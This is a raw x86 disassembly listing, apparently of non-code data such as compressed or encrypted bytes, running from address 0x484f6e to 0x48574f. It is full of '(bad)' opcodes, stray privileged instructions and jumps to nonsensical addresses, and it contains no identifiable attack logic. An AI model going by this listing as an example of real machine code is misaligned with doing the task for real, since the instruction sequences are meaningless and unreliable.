  484f6e:	hlt    
  484f6f:	lahf   
  484f70:	pop    ds
  484f71:	and    esi,DWORD PTR [edi+eiz*2+0x7a]
  484f75:	adc    BYTE PTR [edi+0x43],dl
  484f78:	adc    DWORD PTR [ebx+0x11],edx
  484f7b:	xor    esi,DWORD PTR [edx-0x20]
  484f7e:	dec    esp
  484f7f:	mov    esp,ds
  484f81:	(bad)  
  484f83:	push   eax
  484f84:	test   DWORD PTR [eax-0x827afb0],0xd006e1f
  484f8e:	mov    bl,0xc4
  484f90:	push   0x6
  484f92:	ja     0x485005
  484f94:	mov    ah,0xaf
  484f96:	add    edx,DWORD PTR [esi]
  484f98:	mov    ah,0xe4
  484f9a:	ror    BYTE PTR [esi+0x35],0x6
  484f9e:	add    BYTE PTR [eax],bh
  484fa0:	mov    bl,0xcf
  484fa2:	repz or ebx,DWORD PTR [esi]
  484fa5:	sub    DWORD PTR ds:0xdcdc3c27,esi
  484fab:	cli    
  484fac:	test   edx,ebp
  484fae:	cmp    eax,DWORD PTR [esi+0x44]
  484fb1:	setg   al
  484fb4:	pushf  
  484fb5:	adc    al,0x3
  484fb7:	inc    edi
  484fb8:	dec    esp
  484fb9:	jne    0x484f4d
  484fbb:	ret    0xb44f
  484fbe:	push   esi
  484fbf:	dec    esp
  484fc0:	or     BYTE PTR [esi-0x52cb544c],bl
  484fc6:	and    al,0x30
  484fc8:	cmp    al,BYTE PTR [eax+0x40]
  484fcb:	and    eax,0xe6483a14
  484fd0:	(bad)  
  484fd1:	dec    eax
  484fd2:	rol    DWORD PTR [eax+0x48],cl
  484fd5:	adc    ah,BYTE PTR [ecx]
  484fd7:	iret   
  484fd8:	clc    
  484fd9:	or     BYTE PTR [esi],0x1c
  484fdc:	ins    BYTE PTR es:[edi],dx
  484fdd:	or     BYTE PTR [edi+ebx*8-0x66e63da3],ah
  484fe4:	rcl    bh,1
  484fe6:	rcl    al,0x87
  484fe9:	and    al,0x3c
  484feb:	sbb    al,BYTE PTR [ebp+0x6cb096d]
  484ff1:	test   al,0x17
  484ff3:	xor    al,0x45
  484ff5:	sti    
  484ff6:	stc    
  484ff7:	ret    
  484ff8:	lods   al,BYTE PTR ds:[esi]
  484ff9:	mov    eax,0x61423ab4
  484ffe:	jmp    0x1100:0x900b01d5
  485005:	sbb    DWORD PTR [ecx],ebx
  485007:	jbe    0x484fc4
  485009:	pop    ds
  48500a:	xchg   esp,eax
  48500b:	stos   DWORD PTR es:[edi],eax
  48500c:	xchg   edi,eax
  48500d:	out    0x7b,al
  48500f:	cwde   
  485010:	jl     0x485030
  485012:	adc    DWORD PTR [eax+esi*8+0x48],eax
  485016:	add    ebp,ebx
  485018:	dec    edx
  485019:	dec    eax
  48501a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48501b:	dec    esp
  48501c:	mov    ebx,0x80ac29b
  485021:	in     eax,0x4d
  485023:	ins    DWORD PTR es:[edi],dx
  485024:	loop   0x48509f
  485026:	retf   
  485027:	and    edx,DWORD PTR [ebx-0x38]
  48502a:	cmp    BYTE PTR [ecx+0x3d],bl
  48502d:	push   0xe0bccc85
  485032:	shr    BYTE PTR [esi+0x37e0444a],1
  485038:	pop    eax
  485039:	xor    BYTE PTR [edi+esi*4-0x20],bh
  48503d:	add    BYTE PTR [ebx],dl
  48503f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  485040:	jae    0x48507f
  485042:	ret    0x9b0f
  485045:	mov    ebp,0x41740461
  48504a:	adc    DWORD PTR [ecx],eax
  48504c:	adc    BYTE PTR [ecx+0x7c659590],0xff
  485053:	or     DWORD PTR [ebx],ebp
  485055:	or     BYTE PTR [eax-0x1b1b1fef],0xed
  48505c:	and    esi,esi
  48505e:	in     al,dx
  48505f:	jmp    0x4850b2
  485061:	aaa    
  485062:	hlt    
  485063:	jmp    0x48509a
  485065:	xor    DWORD PTR [ebp+0x2c],0x358273dc
  48506c:	(bad)  
  48506d:	sbb    edx,DWORD PTR [ebx-0x27]
  485070:	test   ch,ah
  485072:	es in  eax,dx
  485074:	mov    WORD PTR [edx+esi*8],cs
  485077:	adc    bl,BYTE PTR [edi+ebp*4-0x34e3dd5]
  48507e:	or     BYTE PTR [edx],al
  485080:	push   esp
  485081:	sbb    DWORD PTR cs:[esp+edx*4-0x6c171b74],0x61
  48508a:	inc    ebx
  48508b:	in     al,dx
  48508c:	aaa    
  48508d:	lock std 
  48508f:	add    ah,ah
  485091:	xchg   edx,eax
  485092:	xchg   ecx,eax
  485093:	xchg   ecx,eax
  485094:	xchg   esp,eax
  485095:	in     al,0x8c
  485097:	call   0xb13452e2
  48509c:	popf   
  48509d:	mov    BYTE PTR [eax-0x62],0x65
  4850a1:	add    DWORD PTR [edi],ecx
  4850a3:	(bad)  
  4850a4:	enter  0x374d,0x5
  4850a8:	mov    eax,0x3cbdc3c2
  4850ad:	pop    esp
  4850ae:	cmc    
  4850af:	frstor [ecx]
  4850b1:	mov    ebx,0x56f15b54
  4850b6:	jne    0x48508a
  4850b8:	add    esp,ecx
  4850ba:	es and esi,ecx
  4850bd:	retf   
  4850be:	sub    al,0x7f
  4850c0:	add    BYTE PTR [ebx],cl
  4850c2:	hlt    
  4850c3:	cmp    BYTE PTR [ecx+0x2022b51],dh
  4850c9:	(bad)  
  4850ca:	jae    0x4850cd
  4850cc:	dec    edi
  4850cd:	jl     0x4850dc
  4850cf:	push   es
  4850d0:	adc    eax,0x9e1f130b
  4850d5:	jb     0x4850db
  4850d7:	sub    al,0xc0
  4850d9:	xchg   ebx,eax
  4850da:	and    ebp,ebx
  4850dc:	leave  
  4850dd:	sub    al,0x5f
  4850df:	or     al,0x42
  4850e1:	add    al,0x99
  4850e3:	mov    cl,cl
  4850e5:	div    DWORD PTR [eax+eiz*2+0x35f480c]
  4850ec:	loope  0x4850df
  4850ee:	ret    0x5ebc
  4850f1:	pop    edi
  4850f2:	dec    ebp
  4850f3:	jne    0x485157
  4850f5:	lock paddd mm2,mm4
  4850f9:	inc    ebp
  4850fb:	cmp    eax,0x6
  4850fe:	ja     0x856c99b3
  485104:	jmp    0xe79f:0x66389248
  48510b:	imul   eax,DWORD PTR [esi],0x3b2e1406
  485111:	cmp    BYTE PTR [edi],ah
  485113:	push   ebp
  485114:	sbb    DWORD PTR [edx-0x3d],eax
  485117:	jbe    0x485192
  485119:	and    BYTE PTR [ecx],al
  48511b:	iret   
  48511c:	mov    al,0x8f
  48511e:	adc    eax,0x291b7e68
  485123:	push   eax
  485124:	or     al,0xad
  485126:	or     al,0xeb
  485128:	mov    al,ds:0x64b0fd8d
  48512d:	xor    ebp,esp
  48512f:	add    DWORD PTR [eax],edx
  485131:	jmp    0x48518a
  485133:	sbb    DWORD PTR [eax+ecx*1-0x6f],ecx
  485137:	mov    bl,BYTE PTR [esi]
  485139:	mov    ecx,ss
  48513b:	adc    ch,bl
  48513d:	cmp    eax,0x570d2957
  485142:	es xchg ebp,eax
  485144:	xchg   esi,eax
  485145:	(bad)  
  485146:	jmp    0x58376297
  48514b:	adc    al,0xd0
  48514d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48514e:	scas   eax,DWORD PTR es:[edi]
  48514f:	loop   0x4851cd
  485151:	mov    eax,0xa8b35589
  485156:	pmullw mm7,QWORD PTR [eax]
  485159:	xor    BYTE PTR [edx+0x38dc2053],dl
  48515f:	and    esp,edx
  485161:	retf   
  485162:	retf   0xfead
  485165:	setne  BYTE PTR [ecx+0x28]
  485169:	add    al,0x2a
  48516b:	stos   BYTE PTR es:[edi],al
  48516c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48516d:	cs sbb eax,0x7c36697c
  485173:	inc    edx
  485174:	push   ebp
  485175:	inc    eax
  485176:	cli    
  485177:	add    eax,0x390b9586
  48517c:	repz cmp al,0xcf
  48517f:	mov    WORD PTR fs:[esi],es
  485182:	and    esi,DWORD PTR [edi]
  485184:	dec    ebx
  485185:	and    edi,DWORD PTR [edi]
  485187:	mov    esp,0x396a5acf
  48518c:	stos   DWORD PTR es:[edi],eax
  48518d:	push   ss
  48518e:	sub    edx,DWORD PTR [eax+0x4c]
  485191:	sub    ebx,ebx
  485193:	shl    BYTE PTR [edx+0xf],0x44
  485197:	push   ebx
  485198:	daa    
  485199:	xlat   BYTE PTR ds:[ebx]
  48519a:	int    0x74
  48519c:	jl     0x4851e0
  48519e:	aas    
  48519f:	(bad)  
  4851a0:	in     al,dx
  4851a1:	inc    edi
  4851a2:	adc    BYTE PTR [esi+0x66],dh
  4851a5:	xchg   ch,dh
  4851a7:	mov    dh,0x1d
  4851a9:	cmp    eax,0x8481f20
  4851ae:	test   eax,0xdd48125
  4851b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4851b4:	push   ecx
  4851b5:	pop    es
  4851b6:	repnz cmp esi,esp
  4851b9:	mov    eax,0x1f0c0653
  4851be:	mov    eax,DWORD PTR [esp+edi*2+0x5a]
  4851c2:	jb     0x2aa2bf32
  4851c8:	jmp    0x48520f
  4851ca:	pop    ds
  4851cb:	sbb    BYTE PTR [edi],dl
  4851cd:	mov    DWORD PTR [eax],ebp
  4851cf:	std    
  4851d0:	in     al,dx
  4851d1:	xchg   ecx,eax
  4851d2:	fcom   DWORD PTR [edi]
  4851d4:	adc    bl,BYTE PTR [edi+edx*1]
  4851d7:	cmp    bl,BYTE PTR [eax+0x5b]
  4851da:	jne    0x4851ed
  4851dc:	(bad)  
  4851de:	dec    ebx
  4851df:	ins    BYTE PTR es:[edi],dx
  4851e0:	cmc    
  4851e1:	cdq    
  4851e2:	push   ecx
  4851e3:	outs   dx,BYTE PTR ds:[esi]
  4851e4:	leave  
  4851e5:	or     BYTE PTR [edi],cl
  4851e7:	jmp    0x485176
  4851e9:	adc    al,0xe9
  4851eb:	xchg   esi,eax
  4851ec:	into   
  4851ed:	ror    BYTE PTR [edi],0x8c
  4851f0:	(bad)  
  4851f1:	sbb    al,0xf8
  4851f3:	cmp    edx,DWORD PTR [ebx]
  4851f5:	inc    edx
  4851f6:	xor    DWORD PTR [ecx],ebp
  4851f8:	pop    es
  4851f9:	cmp    bl,BYTE PTR [edi-0x78]
  4851fc:	cmp    eax,0x705dbe38
  485201:	out    dx,eax
  485202:	cmp    BYTE PTR [edi-0x1e],0x1e
  485206:	mov    eax,ds:0xd1475478
  48520b:	ins    DWORD PTR es:[edi],dx
  48520c:	add    ebp,DWORD PTR [esi+0x24111530]
  485212:	or     al,0x9b
  485214:	and    DWORD PTR [edi+0x3d],0xffffff9b
  485218:	dec    esi
  485219:	or     ch,dh
  48521b:	dec    eax
  48521c:	push   eax
  48521d:	cmp    esi,DWORD PTR [eax+eax*2+0x3f]
  485221:	(bad)  [eax+0x3]
  485224:	test   BYTE PTR [ecx],0x46
  485227:	out    0x3b,eax
  485229:	jo     0x485233
  48522b:	jge    0x48524e
  48522d:	pushf  
  48522e:	xchg   esp,eax
  48522f:	nop
  485230:	cmp    eax,0x1e051d50
  485235:	mov    DWORD PTR [ebp+0x2407cb71],ebx
  48523b:	(bad)  
  48523c:	hlt    
  48523d:	rcr    DWORD PTR [ebx-0x36],cl
  485240:	dec    esp
  485241:	fdivr  QWORD PTR [ecx]
  485243:	iret   
  485244:	loope  0x4852b3
  485246:	push   edi
  485247:	xor    al,0xd0
  485249:	jne    0x485243
  48524b:	aas    
  48524c:	xor    eax,0x40782860
  485251:	jno    0x485295
  485253:	push   ebx
  485254:	hlt    
  485255:	xor    DWORD PTR [ebp-0x7f08ed61],0xffffff88
  48525c:	pop    ebp
  48525d:	lock int 0x7f
  485260:	push   edi
  485261:	(bad)  
  485262:	xchg   edx,eax
  485263:	cmp    cl,dh
  485265:	out    0x2,al
  485267:	and    eax,0xd9c0c911
  48526c:	push   eax
  48526d:	pop    ecx
  48526e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48526f:	jne    0x48523a
  485271:	aas    
  485272:	test   BYTE PTR [eax+0x1e],dl
  485275:	rol    BYTE PTR [edi+ebp*1],0x59
  485279:	loopne 0x485224
  48527b:	shl    BYTE PTR [ebp-0x46],1
  48527e:	pop    es
  48527f:	mov    ebx,0x86fe834e
  485284:	daa    
  485285:	mov    esp,0xa0f6469
  48528a:	popa   
  48528b:	sub    eax,DWORD PTR [edx+0xd]
  48528e:	fcomp  DWORD PTR [ebx+0x56]
  485291:	sbb    eax,0xe0fee069
  485296:	mov    dl,BYTE PTR ds:0x503af654
  48529c:	popa   
  48529d:	jne    0x4852a7
  48529f:	push   eax
  4852a0:	ficom  WORD PTR [ebp-0x489b43bb]
  4852a6:	test   al,0x3
  4852a8:	inc    esp
  4852a9:	sub    BYTE PTR [esi+edx*4],bl
  4852ac:	mov    edi,0x78929887
  4852b1:	push   ebp
  4852b2:	lock jnp 0x48526d
  4852b5:	gs dec edx
  4852b7:	loope  0x485315
  4852b9:	mov    esi,0x1ca71728
  4852be:	fisttp QWORD PTR [eax+0x10e01dd1]
  4852c4:	aas    
  4852c5:	push   ss
  4852c6:	cmp    al,0xbe
  4852c8:	hlt    
  4852c9:	mov    eax,ds:0x2b321b8c
  4852ce:	add    BYTE PTR [ecx+0x6e],bl
  4852d1:	xchg   ebx,eax
  4852d2:	ret    0x94e1
  4852d5:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4852d7:	xchg   ecx,eax
  4852d8:	mov    WORD PTR ds:0x4bea53e4,ds
  4852de:	pop    esp
  4852df:	aaa    
  4852e0:	cmp    al,0x55
  4852e2:	mov    al,0xc8
  4852e4:	and    ch,ch
  4852e6:	imul   ebp,DWORD PTR [eax+0x29],0xffffff90
  4852ea:	pop    ecx
  4852eb:	adc    BYTE PTR [edx],al
  4852ed:	add    esp,DWORD PTR [edi]
  4852ef:	or     DWORD PTR [edx+esi*1],0x4
  4852f3:	add    eax,0x3a143306
  4852f8:	inc    ecx
  4852f9:	xchg   ecx,eax
  4852fa:	ror    BYTE PTR [ebx-0x39],0xf
  4852fe:	inc    esi
  4852ff:	jb     0x485363
  485301:	(bad)  
  485303:	cmp    al,0x93
  485305:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  485306:	bound  edx,QWORD PTR [edi+0x690c2ef0]
  48530c:	out    0x61,eax
  48530e:	pop    ebp
  48530f:	cmp    BYTE PTR [edx+0x5f],ch
  485312:	in     al,dx
  485313:	and    ebx,DWORD PTR [edi+ecx*1-0x17]
  485317:	sbb    ch,BYTE PTR [edi]
  485319:	jbe    0x485331
  48531b:	daa    
  48531c:	ins    DWORD PTR es:[edi],dx
  48531d:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  48531f:	fbld   TBYTE PTR ds:0x1560fa0a
  485325:	sbb    DWORD PTR [eax+0x54],ecx
  485328:	jb     0x48533d
  48532a:	xchg   ebx,eax
  48532b:	xlat   BYTE PTR ds:[ebx]
  48532c:	test   DWORD PTR [esi+0x7b],edx
  48532f:	jecxz  0x48536d
  485331:	scas   al,BYTE PTR es:[edi]
  485332:	mov    al,ds:0xc3815c6f
  485337:	xchg   ebp,eax
  485338:	jg     0x485371
  48533a:	and    BYTE PTR [edi+0x5aea9009],bh
  485340:	(bad)  
  485341:	pusha  
  485342:	push   esp
  485343:	out    dx,eax
  485344:	mov    edi,0xad0b8989
  485349:	call   0x4c80b9d5
  48534e:	imul   ebx,ebp,0xc3df80ff
  485354:	push   cs
  485355:	mov    ch,bh
  485357:	jne    0x485364
  485359:	inc    ebp
  48535a:	inc    esi
  48535b:	xchg   ecx,eax
  48535c:	ret    0x8296
  48535f:	add    eax,0x81c42d16
  485364:	mov    ah,0x38
  485366:	add    al,0x43
  485368:	push   edi
  485369:	ret    
  48536a:	and    BYTE PTR [edi+ecx*8-0x7a],cl
  48536e:	in     eax,0xe5
  485370:	rcr    esp,1
  485372:	inc    esp
  485373:	nop
  485374:	cmp    eax,0x1e3464b9
  485379:	jno    0x4853ab
  48537b:	mov    dl,0xf3
  48537d:	add    al,0xb0
  48537f:	inc    edx
  485380:	mov    ecx,0x974530ac
  485385:	sar    BYTE PTR [ebp+0x301e9ad6],1
  48538b:	cmp    eax,DWORD PTR [edx+0x52]
  48538e:	and    al,0x2d
  485390:	xor    dl,dh
  485392:	shr    BYTE PTR [ebx],1
  485394:	push   esi
  485395:	xor    ecx,edx
  485397:	sub    edx,DWORD PTR [edi+0x48]
  48539a:	sub    eax,DWORD PTR [eax-0x7c]
  48539d:	imul   eax,DWORD PTR [ebx+esi*4+0x36c1fce7],0xffffffa3
  4853a5:	(bad)  
  4853a6:	jmp    0xb28d4d
  4853ab:	dec    edi
  4853ac:	icebp  
  4853ad:	jbe    0x48535a
  4853af:	adc    DWORD PTR [eax],esi
  4853b1:	or     DWORD PTR ds:[edx-0x1c],edx
  4853b5:	adc    DWORD PTR [ecx-0x13a4b86e],0x3d
  4853bc:	pop    DWORD PTR [edi+eax*4]
  4853bf:	cmp    BYTE PTR [eax-0x59],bl
  4853c2:	sub    eax,0x4178e85d
  4853c7:	sub    bh,dh
  4853c9:	pop    ds
  4853ca:	add    DWORD PTR [ebx-0x3ae7a54e],esi
  4853d0:	sbb    eax,DWORD PTR [eax-0x1f]
  4853d3:	ds int 0xb6
  4853d6:	mov    fs,WORD PTR [eax-0x39]
  4853d9:	clc    
  4853da:	in     al,0x7c
  4853dc:	dec    edx
  4853dd:	or     cl,al
  4853df:	shr    DWORD PTR [esi],1
  4853e1:	inc    edi
  4853e2:	cli    
  4853e3:	rcr    DWORD PTR [ecx-0x447d70e7],cl
  4853e9:	push   edi
  4853ea:	adc    al,0x24
  4853ec:	mov    edi,0x2ef84f43
  4853f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4853f2:	xchg   DWORD PTR [esi-0x41],esp
  4853f5:	shr    al,0xb6
  4853f8:	jmp    0x485430
  4853fa:	icebp  
  4853fb:	xchg   ecx,esi
  4853fd:	into   
  4853fe:	repnz push ebx
  485400:	sbb    DWORD PTR [ebx+0x3],0x30
  485404:	cmp    DWORD PTR [edi-0x3c4dcdab],0xa01e74f1
  48540e:	outs   dx,BYTE PTR ds:[esi]
  48540f:	sub    edx,DWORD PTR [esi]
  485411:	add    edx,DWORD PTR ds:0x87c19846
  485417:	rcr    ebp,1
  485419:	test   eax,0x64701d68
  48541e:	shl    bh,0x3a
  485421:	loop   0x4853c5
  485423:	or     bl,bh
  485425:	fdivrp st(7),st
  485427:	inc    esp
  485428:	dec    eax
  485429:	add    ebx,DWORD PTR [ecx-0x6aca94f8]
  48542f:	xchg   ecx,eax
  485430:	jbe    0x4854a2
  485432:	mov    cl,0x15
  485434:	xor    DWORD PTR [esi-0x34f8fd73],edi
  48543a:	mov    dh,0x78
  48543c:	into   
  48543d:	dec    edi
  48543e:	add    BYTE PTR ds:0x52f601d0,0x1a
  485445:	icebp  
  485446:	xchg   edx,eax
  485447:	ins    BYTE PTR es:[edi],dx
  485448:	daa    
  485449:	aam    0x75
  48544b:	cmc    
  48544c:	push   cs
  48544d:	xchg   esp,eax
  48544e:	icebp  
  48544f:	fwait
  485450:	dec    edx
  485451:	mov    eax,ds:0x55095d67
  485456:	call   0x30a5:0x47f97f8
  48545d:	outs   dx,DWORD PTR ds:[esi]
  48545e:	and    eax,0x5a8536b4
  485463:	stc    
  485464:	mov    ch,0x46
  485466:	and    eax,0x65865c12
  48546b:	shl    DWORD PTR [esi-0x6e],cl
  48546e:	jbe    0x4854b5
  485470:	into   
  485471:	push   esp
  485472:	sbb    BYTE PTR [ebx+ebp*8+0x53ad1c0d],dl
  485479:	jp     0x48540d
  48547b:	cwde   
  48547c:	mov    DWORD PTR [ebx+0x30],esi
  48547f:	out    dx,eax
  485480:	ss mov al,0x69
  485483:	test   eax,0xa97c758f
  485488:	jl     0x485419
  48548a:	add    DWORD PTR [edi+0x2],esi
  48548d:	es jl  0x485442
  485490:	xchg   ebx,eax
  485491:	call   0xba36:0x7714aac2
  485498:	pusha  
  485499:	mov    ds:0x2c52f3b4,al
  48549e:	jb     0x4854a8
  4854a0:	mov    edi,0x11d3f3e9
  4854a5:	das    
  4854a6:	ins    BYTE PTR es:[edi],dx
  4854a7:	mov    al,ds:0xd8a64934
  4854ac:	nop
  4854ad:	test   DWORD PTR [edi+0x3218286],edi
  4854b3:	cmp    eax,0x35861975
  4854b8:	cs stc 
  4854ba:	inc    ecx
  4854bb:	adc    edi,eax
  4854bd:	iret   
  4854be:	cmp    DWORD PTR [ecx+eiz*8+0x7bc7d46a],esp
  4854c5:	pop    es
  4854c6:	imul   ecx,DWORD PTR [edx],0x6
  4854c9:	stos   BYTE PTR es:[edi],al
  4854ca:	add    eax,0x4e52441d
  4854cf:	or     BYTE PTR ss:[eax+edx*2-0x64fe18b7],cl
  4854d7:	cmp    eax,0x8bfb71a7
  4854dc:	iret   
  4854dd:	aas    
  4854de:	(bad)  
  4854df:	jmp    0xd0f271a3
  4854e4:	adc    al,0xae
  4854e6:	jmp    0x485517
  4854e8:	or     eax,0xec28b439
  4854ed:	add    al,0x12
  4854ef:	sub    bh,bl
  4854f1:	hlt    
  4854f2:	sub    eax,0x71276a04
  4854f7:	scas   eax,DWORD PTR es:[edi]
  4854f8:	dec    ebx
  4854f9:	fidivr DWORD PTR [ecx]
  4854fb:	push   ss
  4854fc:	lods   al,BYTE PTR ds:[esi]
  4854fd:	test   al,0x2c
  4854ff:	(bad)  
  485500:	jae    0x485572
  485502:	test   eax,0xf68fa5db
  485507:	cmp    BYTE PTR [ebx-0x1ac8bb7c],ch
  48550d:	fnstenv [esi+0x5]
  485510:	(bad)  
  485511:	call   0x806a9459
  485516:	cmp    esi,edi
  485518:	jle    0x485525
  48551a:	popf   
  48551b:	mov    ebp,DWORD PTR [edx+0x78bcc415]
  485521:	xlat   BYTE PTR ds:[ebx]
  485522:	sub    edx,DWORD PTR [eax+0x55ff3f83]
  485528:	loopne 0x485567
  48552a:	and    DWORD PTR [ecx-0xc],edi
  48552d:	mov    BYTE PTR [ebx-0x37],ch
  485530:	je     0x485535
  485532:	add    edx,DWORD PTR [ecx+0x0]
  485535:	xchg   di,ax
  485537:	mov    ah,0x8
  485539:	sbb    BYTE PTR [edx+eax*8-0x28b6ae49],bl
  485540:	mov    ch,0x42
  485542:	jne    0x48550f
  485544:	and    DWORD PTR [ebx+0x1d],edi
  485547:	mov    ebp,0x96275d67
  48554c:	call   0x4a479196
  485551:	inc    edx
  485552:	sbb    DWORD PTR [ebp+0x11d65e55],ebp
  485558:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48555a:	arpl   si,bp
  48555c:	loop   0x4854f3
  48555e:	sub    BYTE PTR ds:0xf620310,bl
  485564:	mov    bh,0x2c
  485566:	or     eax,0xf2c08ce8
  48556b:	or     ecx,DWORD PTR [eax]
  48556d:	(bad)  
  48556e:	ja     0x48551c
  485570:	adc    DWORD PTR [ecx-0x4075f580],ebx
  485576:	popf   
  485577:	xchg   edx,eax
  485578:	fisub  WORD PTR [eax+ebx*1+0x347b8b5c]
  48557f:	rcl    BYTE PTR [eax+0x52],0xa9
  485583:	mov    dh,0x80
  485585:	push   esi
  485586:	(bad)  
  485587:	retw   
  485589:	or     al,0x99
  48558b:	mov    al,0x27
  48558d:	push   cs
  48558e:	pop    ds
  48558f:	and    al,0x47
  485591:	shr    BYTE PTR [ebx+edx*8],1
  485594:	push   cs
  485595:	xchg   dl,ah
  485597:	dec    ebx
  485598:	push   cs
  485599:	fwait
  48559a:	test   BYTE PTR [esi],0x44
  48559d:	mov    ch,0x22
  48559f:	mov    DWORD PTR [ebx+ecx*4+0x70001f25],edx
  4855a6:	sub    DWORD PTR [ebx],ecx
  4855a8:	push   es
  4855a9:	enter  0x18ad,0x26
  4855ad:	push   es
  4855ae:	fmul   DWORD PTR [edi-0x72]
  4855b1:	push   es
  4855b2:	ds (bad) 
  4855b4:	test   DWORD PTR [esi],0x98340f81
  4855ba:	fs pushf 
  4855bc:	int3   
  4855bd:	and    eax,ecx
  4855bf:	inc    eax
  4855c0:	or     eax,0x9dd20867
  4855c5:	je     0x4855f0
  4855c7:	sbb    eax,0x4946c2ca
  4855cc:	dec    esp
  4855cd:	jnp    0x485567
  4855cf:	adc    BYTE PTR [esi+0x2d],dl
  4855d2:	cmp    al,0x86
  4855d4:	test   BYTE PTR [ebx-0x35d399c9],dh
  4855da:	stc    
  4855db:	or     bh,BYTE PTR [eax]
  4855dd:	and    BYTE PTR [edi-0x26],cl
  4855e0:	popa   
  4855e1:	or     al,BYTE PTR [ebx+eax*4+0x34]
  4855e5:	xor    BYTE PTR ds:0xc2468c7b,0x8e
  4855ec:	mov    dh,0x6e
  4855ee:	and    al,0x3
  4855f0:	mov    DWORD PTR [ebx+0x7f],0xd5f7538d
  4855f7:	ret    0x194f
  4855fa:	xor    al,BYTE PTR [eax+0xe740154]
  485600:	or     DWORD PTR [ebx+0x2d],0x5aa1a4ad
  485607:	add    cl,BYTE PTR [eax+ecx*1]
  48560a:	fidivr DWORD PTR [edi+0x52b5b312]
  485610:	add    DWORD PTR [ecx+0x0],eax
  485613:	cmp    eax,0x19ee9208
  485618:	loope  0x48559a
  48561a:	mov    esi,0x4e1fbba4
  48561f:	push   0xffffff9a
  485621:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  485622:	std    
  485623:	retf   0xc43
  485626:	or     al,BYTE PTR [eax+edx*1+0x48]
  48562a:	adc    al,0xa9
  48562c:	inc    ebp
  48562d:	aam    0x13
  48562f:	sbb    al,0xfc
  485631:	jle    0x485663
  485633:	push   0x94958909
  485638:	xor    DWORD PTR [eax],esp
  48563a:	sbb    al,0x5b
  48563c:	jo     0x4855f5
  48563e:	add    bh,BYTE PTR [eax-0x7a]
  485641:	nop
  485642:	je     0x485658
  485644:	add    BYTE PTR [ebx+ecx*1],ah
  485647:	xchg   BYTE PTR [eax+0x68810037],ch
  48564d:	sbb    al,0x28
  48564f:	cdq    
  485650:	xchg   esi,eax
  485651:	dec    ebp
  485652:	xchg   ecx,eax
  485653:	jg     0x4856c5
  485655:	sbb    al,0xb6
  485657:	test   BYTE PTR [esi-0x2f],dh
  48565a:	adc    eax,DWORD PTR [eax+0x35]
  48565d:	push   cs
  48565e:	xor    al,0x50
  485660:	xor    DWORD PTR [eax+0x66],eax
  485663:	daa    
  485664:	push   es
  485665:	push   ss
  485666:	dec    esp
  485667:	jns    0x4855f9
  485669:	int    0x90
  48566b:	pusha  
  48566c:	jns    0x485606
  48566e:	adc    DWORD PTR [ebx+eax*2+0x5b],eax
  485672:	push   eax
  485673:	ret    0x702
  485676:	inc    eax
  485677:	jmp    DWORD PTR [eax]
  485679:	addr16 jo 0x48569f
  48567c:	xchg   ebp,eax
  48567d:	adc    edx,DWORD PTR [edi-0x27]
  485680:	inc    ebp
  485681:	jle    0x4856ae
  485683:	xchg   ebp,eax
  485684:	mov    WORD PTR [ebp-0x18],fs
  485687:	xchg   ecx,eax
  485688:	cwde   
  485689:	(bad)  
  48568a:	mov    ebp,0x90adb3a3
  48568f:	aam    0x73
  485691:	test   BYTE PTR [ebp+0x74402a7b],0x6a
  485698:	mov    ebx,DWORD PTR [esi+0x4]
  48569b:	push   0xfe4a14aa
  4856a0:	and    ebx,DWORD PTR ds:0xa010a7e9
  4856a6:	push   esp
  4856a7:	ret    0x90d5
  4856aa:	jmp    0x4856c2
  4856ac:	ds mov ah,0x85
  4856af:	inc    eax
  4856b0:	lods   al,BYTE PTR ds:[esi]
  4856b1:	test   DWORD PTR [edi+edi*8+0x3],eax
  4856b5:	call   0x493cee57
  4856ba:	call   FWORD PTR [ecx]
  4856bc:	loop   0x4856a2
  4856be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4856bf:	add    BYTE PTR [edx-0x11],bh
  4856c2:	jmp    0xf0fa7654
  4856c7:	inc    edi
  4856c8:	add    edi,ebp
  4856ca:	inc    ebp
  4856cb:	pushf  
  4856cc:	mov    DWORD PTR [esi-0x1fdf728c],eax
  4856d2:	xor    al,0xbd
  4856d4:	dec    esp
  4856d5:	and    bl,BYTE PTR [esi+0x26a04088]
  4856db:	test   al,0x1d
  4856dd:	or     eax,0xdf733cba
  4856e2:	lds    eax,FWORD PTR [esi+ebp*8]
  4856e5:	cmp    edx,DWORD PTR [ebp+0x31744450]
  4856eb:	and    DWORD PTR [esi-0x16],eax
  4856ee:	pushf  
  4856ef:	stc    
  4856f0:	mov    ebp,0x185d8857
  4856f5:	(bad)  
  4856f6:	aas    
  4856f7:	push   ds
  4856f8:	fiadd  DWORD PTR [eax]
  4856fa:	push   0x83981f4c
  4856ff:	loopne 0x485767
  485701:	dec    edx
  485702:	jp     0x48573a
  485704:	xor    eax,0x819b786
  485709:	push   esp
  48570a:	jb     0x4856a4
  48570c:	(bad)  
  48570d:	out    0x9c,eax
  48570f:	adc    ebx,eax
  485711:	cmp    al,0x55
  485713:	mov    esi,0x4c574791
  485718:	rcl    BYTE PTR ds:0xcd1f86c6,0x21
  48571f:	shl    BYTE PTR [esi-0xb9527e9],0x29
  485726:	sahf   
  485727:	nop    DWORD PTR [eax]
  48572a:	bound  eax,QWORD PTR [ecx]
  48572c:	jno    0x48577a
  48572e:	rol    DWORD PTR [ebx-0x3c],cl
  485731:	add    BYTE PTR [ebx-0x27],dh
  485734:	xchg   edx,eax
  485735:	adc    dh,cl
  485737:	ins    BYTE PTR es:[edi],dx
  485738:	test   al,0x6b
  48573a:	mov    bh,0x90
  48573c:	sar    DWORD PTR [ecx+0x4f003044],cl
  485742:	pusha  
  485743:	sub    DWORD PTR [edi+ecx*8+0x1071086],ecx
  48574a:	test   BYTE PTR [ecx],dl
  48574c:	shl    ecx,cl
  48574e:	inc    ebp
  48574f:	inc    edx
